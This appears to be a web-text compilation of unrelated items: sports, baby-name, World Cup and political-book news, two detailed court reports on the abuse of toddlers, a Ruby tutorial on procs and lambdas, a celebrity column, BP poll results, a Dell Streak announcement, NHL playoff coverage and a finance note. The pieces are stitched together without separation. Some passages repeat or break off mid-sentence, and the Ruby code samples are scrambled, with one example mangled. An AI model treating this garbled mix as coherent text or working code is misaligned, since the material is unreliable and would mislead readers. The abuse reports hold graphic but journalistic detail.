SCOTTSDALE , Ariz . --
The Mountain West Conference has performed so well the past two seasons that it could receive an automatic bid to the BCS in the 2012 and ' 13 seasons .
BCS executive director Bill Hancock was hesitant Wednesday to say the MWC , which has placed Utah and TCU in the Bowl Championship Series the last two seasons , was on course to become the seventh automatic qualifying conference .
But he did tell the conference commissioners and athletic directors gathered here this week for meetings that they should be aware of the strides the Mountain West has made toward earning an automatic bid .
The BCS rates non-automatic qualifying leagues using three criteria that measure the strength of its best teams and the league as a whole .
The first two seasons of the four - year evaluation period were 2008 and ' 09 , banner years for the MWC .
The Big East , Big 12 , Big Ten , Atlantic Coast Conference , Pac - 10 and Southeastern Conference currently receive automatic BCS bids .
" If they [ the Mountain West Conference ] meet the threshold , they 'll be the seventh , " Hancock said , though he added the way the other conferences perform over the next two seasons influences that threshold .
Hancock also said the BCS in the future would like to avoid playing its non-championship games on weekday nights because it hurts attendance .
He cited the fact that Iowa brought 28,000 fans in January to the Orange Bowl , which was played on a Tuesday .
For baseball fans , 2009 was the year of the Yankees .
For job seekers , it was the year of the Great Recession .
And for people who track baby names , it was the year of the vampire .
The Social Security Administration released its annual rundown of the most popular names for newborns on Friday , and flying up the list was an ancient name with modern fame : Cullen , the surname of one handsome bloodsucker , Edward , in the frighteningly popular vampire films “ Twilight , ” based on the best - selling novels by Stephenie Meyer .
Cullen materialized at 485 , leaping almost 300 spots from 2008 for the biggest increase of any boy ’s name ; it wedged firmly between Braiden and Kason .

But the nation ’s fascination with the undead may not end there .
The most popular boy ’s name was Jacob , an eternal favorite that happens to be the name of the buff rival of paler - than - thou Edward : Jacob Black .
The most popular name for girls was Isabella , the progenitor of Bella , the love interest of both Edward the vampire and Jacob the werewolf .
Just plain Bella logs in at 58 .
General Cele said his forces were equal to the task of providing security
South Africa 's police chief is hoping the US team are knocked out of the football World Cup early on - to avoid a visit by President Barack Obama .
General Bheki Cele told MPs Mr Obama could fly in if the US make it to the knockout stage .
" Our famous prayer is that the Americans do n't make the second round , " he said , while insisting his forces could provide sufficient security .
He said 43 heads of state would go to South Africa for the Cup .
It is the first world cup being hosted by any African nation .
On Friday , thousands of South Africans queued for hours in Cape Town 's Khayelitsha township to have their photo taken with the World Cup trophy .
The solid gold trophy is starting a month - long tour of the country before the World Cup starts on 11 June .
However , protocol dictates that only heads of state and tournament winners are allowed to actually touch it .
On its arrival , the trophy was taken by Fifa head Jerome Valcke to Nelson Mandela in Johannesburg .
This detachment could also make him a withholding boss who dispensed few thanks or apologies .
“ His reputation for staying calm made even the mildest verbal slight or passing glance sting all the more , ” Mr. Alter writes .
He adds that aides “ often knew Obama was satisfied only when he said ‘ What ’s next ? ’ ” and that some “ came to fear Obama ’s dropped smile , his way of beaming broadly and insincerely before reverting instantly to a frown and a penetrating glare . ”
Mr. Alter emphasizes that Mr. Obama was “ virtually the only one in his inner circle ” who wanted to go for a big health care program in his first year ; many staff members , he says , worried that such “ a big reform package would overload the circuits ” and argued that he should focus on the economy or energy instead .
Mr. Alter adds that health care was not high on Mr. Obama ’s initial to - do list either : an internal memo from his Senate office , he points out , “ showed that as recently as 2006 he had listed his policy priorities in the Senate as energy , education and nonproliferation ; there was no mention of health care . ”
Why did Mr. Obama ’s thinking change ?
As Mr. Alter recounts it , Mr. Obama told his aides that “ in a quiet moment on Election Night he had asked himself , ‘ What ’s the single achievement that would most help average Americans ? ’ ” and that his answer “ was health care reform , though he had n’t emphasized it during the campaign . ”
As president , Mr. Alter goes on , Mr. Obama pressed on “ because for greatness he needed health care ” and “ because he was genuinely convinced that the status quo was financially unsustainable ” given rising health care costs .
On Afghanistan , Mr. Alter writes , the president came “ into office knowing little about the situation on the ground ” there and “ received advice from Bush holdovers that he was n’t prepared to resist . ”
As a result , “ he stumbled into a large commitment without fully realizing what he was getting into , ” and “ when he saw what had happened , he slowed everything down in August and September and launched the most detailed presidential review of a national security decision since the 1962 Cuban Missile Crisis . ”
Although the Pentagon tried to take advantage of the new president ’s inexperience in running a huge bureaucracy and box him into supporting Gen. Stanley A. McChrystal ’s recommendations , Mr. Alter says , the president summoned Mr. Gates and Adm .
Mike Mullen , the chairman of the Joint Chiefs of Staff , to the Oval Office in early October , telling them that leaks and positioning in advance of a decision were “ disrespectful of the process . ”
In what Mr. Alter describes as “ a cold fury ” and as “ the most direct assertion of presidential authority over the U.S. military since President Truman fired General MacArthur in 1951 , ” Mr. Obama demanded to know “ here and now ” if the Pentagon would be on board with any presidential decision and could faithfully implement it .
In this volume Mr. Alter is toughest on what he sees as the narrow approach of the White House ’s economic team in dealing with Wall Street .
He says that , as one former Treasury official observed , the president ’s economics team , headed by Mr. Geithner and Lawrence H. Summers , “ ran the gamut from A to C , ” , and that more progressive voices who had advised the campaign , like Robert Reich and Joseph Stiglitz , were increasingly marginalized .
Someone held 3 - year - old Noah Scheurman under scalding water until his skin fell off .
Someone pressed his hands against a wall heater that left grill marks on the boy 's flesh .
Someone stuffed him in a freezer .
Clackamas County prosecutor Chris Owen said Noah 's tormentor is Derek John Piskorski , who met boy 's mother last fall and moved in with them in Oregon City .
Piskorski , 23 , went on trial Tuesday in Clackamas County Circuit Court on assault and criminal mistreatment charges .
When Oregon City detectives interviewed Piskorski and Noah 's mother , Katey Lynn Scheurman , the couple gave conflicting accounts of the boy 's injuries and changed their stories several times .
Piskorski's defense attorney , Brad Jonasson Jr. , said Noah was obviously injured , but it is unclear how the injuries occurred , under what circumstances , who was present and whether the acts were criminal or accidental .
Owen told Clackamas County Circuit Judge Ronald D. Thom , who is hearing the case , that Noah 's life took a terrible turn when Scheurman and Piskorski met online in October 2009 .
Both were single and unemployed .
By December , they were living together .
The abuse began immediately and escalated , Owen said .
" It was clear that he did n't want Noah in his life or in Katey 's life , " Owen said , and tried to goad her into putting Noah up for adoption .
" ' Hey Noah , let 's go meet your new family , ' " Owen said Piskorski would taunt .
First there were spankings with a belt .
The 6 - foot , 210 - pound Piskorski would throw Noah on the floor , smother him with pillows until he gasped for breath , and let the child play with a razor -- which left Noah with cuts on his chest .
Shortly before Christmas , Scheurman found her son curled into a ball on the kitchen floor .
He had a black eye .
Piskorski told her Noah ran into a doorknob .
" Unfortunately , the violence did n't stop there , " Owen said .
He cataloged several acts of abuse .
Piskorski is a " neat freak " who cleaned the house daily and bathed Noah twice a day , Scheurman testified .
Bath time became torture time .
He forcibly held the child underwater , telling Scheurman , " Look , it 's fun , Noah 's learning to hold his breath underwater , " he said .
Piskorski once emptied the refrigerator 's freezer compartment and stuffed Noah -- who was dressed in his underwear -- into the icebox .
Scheurman opened the door and looked into the eyes of her shivering boy .
Piskorski " had a fixation on burning " Noah , Owen said .
He pressed and held the boy 's hands against a wall heater , searing Noah 's skin .
" Noah was cold , " Piskorski explained .
The beginning of the end of Noah 's torment came on Jan. 9 .
Owen said Piskorski held Noah 's face down while running 130 - degree water over the boy 's neck and upper back .
Piskorski offered several accounts of how Noah got the second - degree burns .
None of the stories are plausible , said Dr. Dan Leonhardt , a pediatrician and child abuse expert at Legacy Emanuel Hospital & Health Center .
Someone forcibly held Noah under the faucet , Leonhardt said .
During a hospital conversation , Noah offered an unprompted explanation .
" Derek dunks me , " he told Leonhardt .
" I was scared .
The water was hot . "
Scheurman pleaded guilty to two counts of criminal mistreatment in March for allowing the abuse .
She is serving a six - month sentence in the Clackamas County Jail .
As Owen cataloged the abuse Noah suffered over two months , he asked Scheurman why she did n't stop Piskorski .
" I guess I was in love with him , " she said .
" I did n't want to lose him . "

Post , Swamp Politics
As you know , I am a big believer in knowing the basics .
I find it is especially valuable to go back to the fundamentals of whatever skill you ’re trying to master periodically , as you gain more experience .
Somehow you ’re always able to extract something valuable from the experience due to the extra insight you ’ve acquired along the way .
Recently I ’ve been looking more closely at some Ruby concepts that I may have glossed over when I was learning the language initially , so I will likely be writing about this in some of my upcoming posts .
I thought I would begin with one of the most powerful features of Ruby – procs ( and lambdas : ) ) .
What ’s So Good About Procs ?
You know how everything in Ruby is an object , well , as it turns out that ’s not quite true .
Ruby blocks are not objects !
We can discuss the implications of that , but let ’s refrain , accept it as fact and move on .
So , blocks are not objects , but you can turn them into objects without too much trouble .
We do this by wrapping our block in an instance of the Proc class ( more on this shortly ) .
This is really great since it turns our block into a first class function , which in turn allows Ruby to support closures and once a language has closures , you can do all sorts of interesting things like making use of various functional concepts .
That however is a story for another time , before we dive deep into those areas , let us really understand how Procs work .
Procs And Lambdas In Detail
There are three ways to create a Proc object in Ruby .
Well , actually there are four ways , but the last one is implicit .
Here they are :
Using Proc.new .
This is the standard way to create any object , you simply need to pass in a block and you will get back a Proc object which will run the code in the block when you invoke its call method .
ruby proc_object = Proc.new {puts " I am a proc object " } proc_object.call [ email protected ] : ~/tmp$ ruby a.rb I am a proc object Using the proc method in the Kernel module .
Being in the Kernel module , this method is globally available .
It is basically equivalent to Proc.new in Ruby 1.9 , but not in Ruby 1.8 .
In Ruby 1.8 the proc method is equivalent to lambda .
As you may have guessed there is a difference between procs and lambdas ( see below ) , so you need to be aware of whether you ’re using Ruby 1.8 or 1.9 .
If you ’re using 1.9 there is a way to find out if you ’re dealing with a proc or a lambda .
The Proc object lambda ?
method : ruby proc_object = proc {puts " Hello from inside the proc" } proc_object.
call puts " Is proc_object a lambda - # {proc_object.lambda?} " [ email protected ] : ~/tmp$ rvm use 1.9.1 Using ruby 1.9.1 p378 [ email protected ] : ~/tmp$ ruby a.rb Hello from inside the proc
Is proc_object a lambda - false
If you ’re in 1.8 this method will not exist at all .
By the way , did you notice how I had to switch Rubies and was able to do so painlessly through the awesome power of RVM , hope you ’re already using it .
As far as I am concerned , if you need to switch between different versions of Ruby , do n’t bother with the proc method , just use Proc.new and you will never have an issue .
Using the Kernel lambda method .
Once again , this is globally available being in the Kernel module , using this method will create a Proc object , but it will be a lambda as opposed to a proc ( if you really need to know what the differences are at this point you can skip to the explanation :) ) .
ruby proc_object = lambda {puts " Hello from inside the proc" } proc_object.call puts " Is proc_object a lambda - # {proc_object.lambda?} " [ email protected ] : ~/tmp$ ruby a.rb Hello from inside the proc
Is proc_object a lambda - true
The implicit way .
When you write a method which will accept a block , there are two ways you can go about it .
The first is to simply use the yield keyword inside your method .
If there is a yield in a method , but there is no block you will get an error .
```ruby def my_method puts “ hello method ” yield end
my_method {puts “ hello block ” } my_method```
hello method hello block hello method a.rb :7: in my_method ' : no block given ( yield ) ( LocalJumpError ) from a.rb:11 :in < main >'
1 2 3 The other way is to use a special parameter in your method parameter list .
This special parameter can have the same name but you will need to precede it with an ampersand .
The block you pass into this method will then be associated with this parameter , you will infact no longer have a block – it will be a Proc object .
You will simply need to call the Proc _call_ method to execute the code in the block you passed in .
The difference is , you can now return your block ( _or rather the Proc object_ ) as the return value of the method , thereby getting your hands on a Proc object without having to use any of the above three methods explicitly .
```ruby
def my_method ( &my_block ) puts “ hello method ” my_block.call my_block end
block_var = my_method {puts “ hello block ” } block_var.call```
hello method hello block hello block
1 2 3 4 5 6 7 Those are all the different ways to get a Proc object in Ruby ( _either a proc or a lambda_ ) .
> ### Fun And Interesting Trivia About Procs And Lambdas > >
If you have a method to which you pass a block , but instead of calling _yield_ , you call _Proc.new_ without giving it a block of its own , it will return a proc that represents the block you passed in to the method e.g. : > > ```ruby
def some_method Proc.new end
my_proc = some_method{puts
“ I am a happy proc” } my_proc.call > > < pre >[ email protected ] : ~/tmp$ ruby a.rb I am a happy proc</ pre > > >
** In Ruby 1.9 , there is actually another way to create lambdas **.
It is n't really a different way , it is simply some syntactic sugar , but it is crazy looking , so worth knowing :) .
The normal way to create a lambda is using the _lambda_ keyword , and if you want your lambda to take parameters , you simply pass them in the normal block way e.g. : > > ruby normal_lambda = lambda { |param1 , param2 | puts “ param1 : #{param1} and param2 : # {param2} “ } normal_lambda.call( 10 , 20 ) > > < pre >[ email protected ] :~/tmp$ ruby a.rb param1 : 10 and param2 : 20</ pre > > >
With the new syntax it is slightly different .
We replace the lambda method with the **->** method ( _as in minus followed by greater than sign_ ) .
The < a href= " http://www.skorks.com/2009/08/method-arguments-in-ruby/ " target = " _blank " > parameters </a> move out of the block , and move into some brackets right after the **->** method ( _so they look like method parameters , but in reality are still block parameters_ ) .
Everything else is the same , so our previous example would look like : > > ruby normal_lambda = ->( param1 , param2 ) {puts “ param1 : #{param1} and param2 : # {param2}“ } normal_lambda.call( 10 , 20 ) ``` > >
[ email protected ] : ~/tmp$ ruby a.rb param1 : 10 and param2 : 20

Once we have created our first class function ( _in Proc form_ ) , there are a few things we may want to do with it , such as calling it or comparing it to another Proc .
As usual , Ruby makes all of this interesting .
Let 's look at Proc equality first .
You can compare procs or lambdas to each other , using the == method ( _just like with any other object_ ) .
Unlike many other objects though , defining exactly the same proc twice will not make them equal .
For example : ```ruby
> >
Everything still works fine ( in Ruby 1.9 , do n’t try this in 1.8 ) , but if you ’re using Netbeans , this syntax is way too crazy for it and it will barf all over itself .
This syntax is an interesting curiosity , but ( especially if you ’re using Netbeans ) and that of everyone else who has to read your code later .
string1 = “ blah ” string2 = “ blah ”
puts “ #{string1 == string2 } ”
proc1 = Proc.new {“ blah ” } proc2 = Proc.new {“ blah ” }
puts “ # {proc1 == proc2} ” ```
String are equal ?
- true Procs are equal ?
- false
1 2 3 There are only two ways that two procs or lambdas will be equal to each other .
One way is to define two really simple procs that have the same object in them e.g. : ```ruby
proc1 = Proc.new{string1} proc2 = Proc.new{string1}
puts “ Procs are equal ?
- #{proc1 == proc2}” ```
Procs are equal ?
- true
1 2 3 This is not really very useful .
The other way that two procs will ever be equal is if they are clones of each other ( _one was created by using the clone or dup method on the other_ ) .
```ruby
proc1 = Proc.new{|x | “ blah1 ” * x} proc2 = proc1.dup
puts “ Procs are equal ?
- #{proc1 == proc2}” ```
Procs are equal ?
- true
1 2 3 Let us now look at executing procs .
We have already seen the call method ; this is the most common way to execute a proc or lambda .
```ruby
puts Proc.new{|x | “ blah1”*x}. call(2) ```
blah1blah1
1 2 3 But , there are actually two other ways .
The first is to use the array syntax , this works in both Ruby 1.8 and 1.9 : ```ruby
puts Proc.new{|x| “ blah1”*x}( #difference ) ```
blah1blah1
1 2 3 The other is the dot syntax , which only works in 1.9 . ```ruby
puts Proc.new{|x | “ blah1 ” *x} .
( 2) ```
blah1blah1
1 2 3 This syntax being 1.9 only will once again cause Netbeans to barf all over itself :) .
Both of those ways are nice and succinct , but ** I still recommend you use _call_ ; it is not that much longer and is much more readable , both for yourself and for others **.
The array syntax could be especially confusing , consider : ```ruby
some_var [ 2,3 ] ```
1 2 3 4 5 6 7 That could refer to an array , a string , a proc – without context it 's a bit too ambiguous for my tastes , stick to _call_ .
> ### Even More Trivia About Procs And Lambdas > >
You may not know this , but procs and lambdas have an _arity_ method which allows you to find out how many arguments a Proc objects expects to receive ( _< a href = " http://ruby-doc.org/core/classes/Method.html " target = " _blank " > Method < /a> objects also have this method_ ) .
For example : > > ```ruby
my_proc = Proc.new {|x |“ blah1 ” * x} puts “ I need #{my_proc.arity} arguments ” > > < pre >[ email protected ] : ~/tmp$ ruby a.rb I need 1 arguments </ pre> > >
Pretty simple – the fun bit starts when the block you use to create the proc expects an arbitrary number of arguments ( _or requires some , but sponges up the rest using a * prefixed final parameter_ ) e.g. : > > ruby my_proc = Proc.new{|x , * rest | “ blah1 # {x} - # {rest} ” } puts “ I need #{my_proc.arity} arguments ” > > < pre >[ email protected ] : ~/tmp$ ruby a.rb I need - 2 arguments </ pre> > >
What the hell ?
** When you get a negative number for you arity , it means there is potentially an arbitrary number of arguments involved **.
In this case , all you can do is find out how many arguments are required ( _the rest will be optional_ ) .
You do this by using the **~** operator on the return value of the arity method : > > ruby my_proc = Proc.new{|x , * rest | “ blah1 # {x} - # {rest} ” } puts “ I actually require #{~my_proc.arity} arguments , the rest are optional ” ``` > >
[ email protected ] : ~/ tmp$ ruby a.rb I actually require 1 arguments , the rest are optional
1 2 3 4 5 6 7 < a name = " difference " ></a> ## So What IS The Difference Between Procs And Lambdas ?
It took a while , but we finally got here .
Long story short , ** the real difference between procs and lambdas has everything to do with control flow keywords **.
I am talking about return , raise , break , redo , retry etc. – those control words .
Let 's say you have a return statement in a proc .
When you call your proc , it will not only dump you out of it , but will also return from the enclosing method e.g. : ```ruby
> >
I reckon that ’s interesting stuff to know , it wo n’t save your life on a daily basis , but there will be that one time when knowing this will make you look like an absolute superstar :) .
def my_method puts “ before proc ” my_proc = Proc.new do puts “ inside proc ” return end my_proc.call puts “ after proc ” end
my_method```
before proc inside proc
1 2 3 The final _puts_ in the method , was never executed , since when we called our proc , the return within it dumped us out of the method .
If , however , we convert our proc to a lambda , we get the following : ```ruby
def my_method puts “ before proc ” my_proc = lambda do puts “ inside proc ” return end my_proc.call puts “ after proc ” end
my_method```
before proc inside proc after proc
1 2 3 The return within the lambda only dumps us out of the lambda itself and the enclosing method continues executing .
The way control flow keywords are treated within procs and lambdas is the main difference between them .
Or rather , the way that the _return_ keyword and the _break_ keyword are treated is the difference since most of the others are treated in exactly the same way in both procs and lambdas .
Let 's have a look at _break_ .
If you have a break keyword within a lambda it is treated just like a return : ```ruby
def my_method puts “ before proc ” my_proc = lambda do puts “ inside proc ” break end my_proc.call puts “ after proc ” end
my_method```
before proc inside proc after proc
1 2 3 However , if we change the lambda to a proc : ```ruby
def my_method puts “ before proc ” my_proc = proc do puts “ inside proc ” break end my_proc.call puts “ after proc ” end
my_method```
before proc inside proc a.rb:64 : in block in my_method ' : break from proc-closure ( LocalJumpError ) from a.rb:66 : in call ' from a.rb:66 : in my_method ' from a.rb:70 :in < main >'
1 2 3 We get a LocalJumpError , what happened ?
Well , the break keyword is used to break out of iteration , and we did n't have an iterator around our proc , so we could n't break out of anything , so Ruby tries to punish us with an error .
If we put an iterator around our proc , everything would be fine : ```ruby
def my_method puts “ before proc ” my_proc = proc do puts “ inside proc ” break end [ 1,2,3 ] .each {my_proc.call} puts “ after proc ”
end
my_method```
before proc inside proc after proc

Gwyneth Paltrow , ever the obliging professional , has " opened up " to the Daily Mirror as part of her contractual obligation to provide publicity for her new film , Iron Man 2 .
It is very hard for her to be parted from her children Apple and Moses , she explains , but the nature of her work demands it .
Well , it would have been fine if she had said that .
But she said something else instead : " Some days you think , ' Oh my God .
They 're in the bath right now and I 'm not there . '
And I would cry in my trailer . "
Dear heavens .
Does she cry when it 's Daddy 's turn to put the children to bed , or do she and Chris Martin always do it in unison ?
Does she cry when she has missed a magic moment because she had to be in the front row at a friend 's fashion show , or at a close family member 's gig ?
( Though admittedly , I 'd cry too if I found myself at either a Stella McCartney bash or a Coldplay concert . )
Paltrow may not need to work for money , like most people do , but it is fair enough for her to decide she does not wish to damage her career or subsume her identity because she has children .
In a world in which some bosses ( such as Alan Sugar ) are only too willing to believe that woman - and - child equals unemployably - distracted - hormone - lady , however , Paltrow 's open self - indulgence is nauseating .

Bobby Louch was found with about 80 bruises and injuries at his home in Bexleyheath in December 2008 .
Collette Harris denied the charges , blaming boyfriend James Phillips , who was cleared of all the charges against him .
An Old Bailey judge said the 30 - year - old would serve a minimum of 16 years after being found guilty of murder .
Among the injuries , the toddler had two broken ribs , bleeding in the spine , massive damage to the brain and severe damage to his abdomen , including a damaged liver and pancreas .
Most of the injuries were inflicted in the 48 hours leading up to him being found dead in his cot on Monday 29 December 2008 .
He was kicked in the stomach on Saturday with such force that it damaged vital organs .

The day after , he was vomiting and looking disorientated .
He had a burn mark on his right hand which could have been made by it being placed on an oven door , the jury was told .
However , despite Bobby 's injuries , Harris refused to take him to hospital .
She told a friend she would be suspected of abusing him , the jury heard .
In the early hours of the Monday morning , a neighbour said he heard a baby " whimpering " and murmuring " mummy " .
Later , Harris rang for an ambulance , saying : " My baby wo n't wake up . "
This is a terrible thing you did for reasons which are quite incomprehensible
Recorder of London Judge Peter Beaumont
He had been treated for a broken leg three weeks prior to his death and was kept in for a scan when bruises were seen on his forehead .
Harris blamed the bruises on Bobby being clumsy and banging his head on the cot .
She later tried to blame her new boyfriend Mr Phillips , of Erith , in Kent .
Richard Whittam , QC , prosecuting , said : " There is compelling evidence that the multiple injuries were the result of deliberate and repeated violence . "
Harris screamed , " oh my God " , and collapsed in tears as the jury found her guilty of murder .
Sentencing her , Recorder of London Judge Peter Beaumont said : " This is a terrible thing you did for reasons which are quite incomprehensible . "
' Traumatic and devastating ' Bobby 's father Dan Louch , who separated from Harris in October 2008 , said later : " Bobby was our little angel and had his whole life to look forward to , but was so cruelly denied this for reasons we still can't fully comprehend .
" This can now bring to a close the traumatic and devastating quest to find some answers as to what happened to Bobby . "
After the case , Andrew Flanagan , chief executive of the National Society for Prevention of Cruelty to Children ( NSPCC ) , said : " The level of brutality inflicted on this helpless infant is sickening .
" While governments change , child abuse does not .
We need continuous high - level political leadership to protect children from such horrendous cruelty . "

The Gulf oil spill is indeed a Hurricane Katrina - sized public relations disaster for someone .
But that someone may be BP , not President Obama .
Americans are not happy with the way Obama and the federal government have reacted to the Deepwater Horizon oil spill disaster , according to polls .
A just - out USA Today / Gallup survey , for instance , finds 53 percent of respondents rate Obama ’s response to the oil spill as “ poor ” or “ very poor . ”
But BP is held in lower esteem .
The same survey saw 73 percent of respondents give the actions of the oil firm responsible for the drilling a “ poor ” or “ very poor ” rating .
Other polls have shown similar results .
According to a May 25 CBS survey , 70 percent of respondents disapproved of BP ’s handing of the oil spill .
If there is a silver lining in public opinion for the oil giant , it is that events in the Gulf may not affect consumer decision - making at the gas pump .
Seventy percent of those who responded to a May 24 CNN poll said the oil spill “ has not affected ” their gasoline purchasing decisions .
However , the spill certainly has undercut public support for offshore drilling , at least for the moment .
Forty - six percent of respondents to the CBS poll agreed that the risks are now too great for the US to increase offshore oil exploration .
Two years ago , only 28 percent of Americans felt that way , according to CBS .
If nothing else , Americans appear to view the BP Deepwater Horizon spill and its aftermath as a defining event .
Almost 40 percent feel it will turn out to be the worst environmental disaster in 100 years , according to Gallup .
And they are following the story with intensity .
Eighty - seven percent of Americans say they are watching Deepwater Horizon disaster ’s events “ very closely , ” according to the recent Gallup poll .
The oil spill “ ranks among the top 10 most closely - followed news stories Gallup has measured since 1991 , ” writes Gallup analyst Lymari Morales .

One of Dell ’s worst kept secrets , the Dell Streak , has finally been officially unveiled by Dell .
The phone / tablet hybrid is slated to launch in early June and will be available exclusively on the O2 mobile carrier in the UK .
I have n’t had the chance to play with one yet , but the Dell Streak seems like it will be a bit of an awkward phone , primarily due to its massive screen .
With a 5 inch screen the phone attempts to fill in the gap between full blown tablets and cellphones … a gap that I ’m not sure necessarily needed to be filled .
From what I ’ve read , the phone looks a bit goofy when held up to the face and used for calls .
Other than that , the device has some pretty impressive features :
Android platform complete with Android Market and Dell user interface enhancements
ARM - based Processor : Qualcomm ’s powerful and efficient Snapdragon chipset and software platform with integrated 1GHz processor
3G + WiFi + Bluetooth
UMTS / GPRS / EDGE class 12 GSM radio with link speeds of up to HSDPA 7.2 Mbps / HSDPA
5 MP autofocus camera with dual LED flash .
Easy point , shoot , and uploads to YouTube , Flickr , Facebook and more
User accessible Micro SD expandable memory available up to 32 GB .
Store up to 42 movies or 32,000 photos , or 16,000 songs with 32 GB * Micro SD
I do n’t see it in the press release , but originally the Dell Streak was to ship with Android 1.6 .
I have n’t heard anything to contrary , so as of right now we ’ll go with that .
The press release does mention that the Streak will support over the air updates to Android 2.2 so it can support Flash 10.1 :
The Dell Streak was designed with the future in mind and will support over - the - air updates including platform upgrades , Adobe Flash 10.1 on Android™ 2.2 later this year , video chat applications and other software innovations .
While I ’m not sure the device is for me , I ’m sure there are a few people that will find a tablet / phone hybrid useful .
Are you one of them ?
Sound off in the comments and let us know why the Streak does or does n’t appeal to you .

Gill no surprise to Penguins
The
But as a free agent last summer , Gill became part of the corps of new faces in Montreal and one of the big reasons -- no pun , Gill is 6 - foot - 7 , 241 pounds -- the Canadiens have made life miserable for first ,
" What he has done for the Canadiens this year in the playoffs is not a surprise to us , " Penguins coach
A skate cut kept Gill out of Game 6 and he likely will be a game - time decision for Game 7 .

" We knew we were playing a guy who had won four series last year as a shutdown guy , " Bylsma told reporters .
" He has been all of that .
He has been all of the 6 - foot - 7 that he is out on the ice . "
-- Phil Coffey
The Pittsburgh Penguins knew exactly what they were going to get from Hal Gill in the Eastern Conference Semifinals , because Gill gave it to the Penguins last spring , helping Pittsburgh win the Stanley Cup .
But as a free agent last summer , Gill became part of the corps of new faces in Montreal and one of the big reasons -- no pun , Gill is 6 - foot - 7 , 241 pounds -- the Canadiens have made life miserable for first , Alex Ovechkin , and now Sidney Crosby " What he has done for the Canadiens this year in the playoffs is not a surprise to us , " Penguins coach Dan Bylsma said .
A skate cut kept Gill out of Game 6 and he likely will be a game - time decision for Game 7 .
His return would be huge -- again , no pun -- because Gill and Josh Gorges have been a formidable duo against Crosby , limiting him to just 1 goal and 4 assists in the series .
" We knew we were playing a guy who had won four series last year as a shutdown guy , " Bylsma told reporters .
" He has been all of that .
He has been all of the 6 - foot - 7 that he is out on the ice . "
The ghosts have moved .
For years , the complaint about Montreal 's Bell Centre has been that the " ghosts " of the venerable Montreal Forum had not made the move to the new building that opened its doors on March 16 , 1996 .
Now , they are in full throat at the Bell Centre .
Need proof ?
How about all those Penguins shots that rang off the iron in Game 6 ?
How about that sweet backhander from Mike Cammalleri ?
How about that goal off the stick of Jaroslav Spacek , who had been ailing and out of the picture ?
How about the super saves from Jaroslav Halak Few can complain about now that the Canadiens have become a team bordering on mythic proportions thanks to an inspiring Stanley Cup run that has seen the eighth - seeded team in the East knock off the top - seeded Washington Capitals and now are within a game of doing the same to the defending Stanley Cup champion Pittsburgh Penguins " It 's reality , " says Cammalleri , the smallish winger who leads the Stanley Cup Playoffs in goals with 11 .
" If you pinch yourself , you start staring around , and we can't stop now .
" Not when the next achievement , a berth in the Eastern Conference Finals , is so tantalizingly close and will be determined one way or the other Wednesday night in Pittsburgh ( 7 p.m. ET , VERSUS , CBC , RDS ) .
" It is one of those years , but we 've battled through it and learned a lot about ourselves , " Scott Gomez said .
" It 's one of those years , but whoever is in the lineup , we 'll go at it . "
" I think that 's just the way this group is .
We 're a tight group and we want to play for each other , " said defenseman Jose Gorges , whose play against Sidney Crosby and Company has been huge in this series .
" We want to go to war for each other .
No one is satisfied with going home yet .
We 're not satisfied with what we 've done and we want to keep playing .
Guys are willing to do whatever it takes to get back in the lineup and help this team win .
" Should we really be surprised ?
After all , these are the Montreal Canadiens , winners of 24 Stanley Cups and the team that has boasted arguably a wing of the Hockey Hall of Fame .
Actually , yes , we should be somewhat surprised because the current Canadiens have overcome a boatload of change and adversity to reach this point .
In the playoffs , teams are used to dealing with adversity , it is part of the right of passage .
But the Canadiens ' defense has been ravaged by injury to the point it is teasing the bounds of reality to believe the series with Pittsburgh is going to Game 7 .
Montreal 's top defenseman , Andrei Markov , is out with a knee injury suffered against the Pens .
Spacek returned from a virus for Game 6 and scored the winning goal .
Hal Gill , the former Penguin who has formed a shutdown pair with Gorges , missed Game 6 with a laceration of his leg .
But rookie P.K. Subban has joined the defense and has played like a seasoned veteran .
Ryan O'Byrne also has been strong , and while Marc - Andre Bergeron is a minus - 11 , his work on the power play has been needed .
" No one really expected us to be here in the first place , " O'Byrne said .
" You can't play tentative .
You have to play loose and enjoy the moment .
There 're a lot of guys in this room with a lot of pride and we 're not ready to go home ready .
" The Canadiens ' ascent actually began last summer , but it has been a long , and at times painful process .
After the 2008 - 09 season , the Canadiens allowed 10 free agents to move on , most notably Alex Kovalev Saku Koivu and Alex Tanguay .
In essence , the team changed its identity .
In their place , the Canadiens acquired three small forwards -- Cammalleri , Brian Gionta and Gomez -- for a lot of cash and seemingly bucking the trend to ice bigger players .
There also was a new coach in Jacques Martin , but some of the same old problems in goal , where neither Halak or Carey Price was established as the No. 1 goalie .
As a result , the Canadiens were n't much to crow about during the regular season , eventually landing as the eighth seed in the Eastern Conference at 39 - 33 - 10 .
The regular season was so disappointing that GM Bob Gainey opted to resign and hand the job over to Pierre Gauthier .
The legendary Habs were expected to be cannon fodder for Alex Ovechkin and Company in the first round .
But then Jaroslav Halak happened .
The goalie drew comparisons to the legendary Ken Dryden as the Canadiens overcame a 3 - 1 deficit to oust the heavily favored Capitals .
Today , Halak owns a 7 - 5 record , 2.45 goals - against average and .932 save percentage .
His play belies those statistics though .
Halak has been the motor that makes the Canadiens go , but his teammates have followed suit in shutting down some the NHL 's top offensive stars .
"
One thing that is a given in the playoffs is obstacles , and we 're missing two key guys but , we 've had other guys step up , " said Dominic Moore , a late - season addition from Florida who has cemented a strong checking line with Tom Pyatt and Travis Moen .
" It is team defense for a reason -- that is why everyone has to do their part .
" Now , the Canadiens have taken the Penguins to Game 7 .
Can they do it again ?
Or are they pushing the envelope -- and reality -- to ponder the idea that the eighth - seeded team can pull off another monumental upset in Game 7 ?
" Game 7s , feel like a flip of the coin , ” Penguins coach Dan Bylsma said .
And the Habs like their chances to see the coin fall their way .
Chances are the ghosts will be pushing in the right direction .

Pimco's McCulley does a rather good dissection of the shadow banking system , and aside for the conclusion that the Fed should be the ultimate controller of everything , we believe it is a worthwhile read .
We obviously disagree with McCulley on his view of the Fed - the Chairman is simply far too political , incompetent ( do n't make us take out all the clips of Bernanke rehashing the Moody 's model and claiming housing was going up in perpetuity ) secretive and in the big banks ' pocket , which explains why Pimco of course is a fan , with its $ 1 trillion + dollars in AUM .
A systemic change in which the precarious financial balance is toppled would simply wipe it off the face of Fashion Island overnight .
That said , McCulley 's other points are worth reading as he does the shadow banking system justice , specifically explaining how it is a $ 3 trillion Frankensteinian time bomb construct of the Keynesian religion that it is just awaiting to go off and wipe out the bulk of US deposits in one fell swoop .
After the Crisis : Planning a New Financial Structure
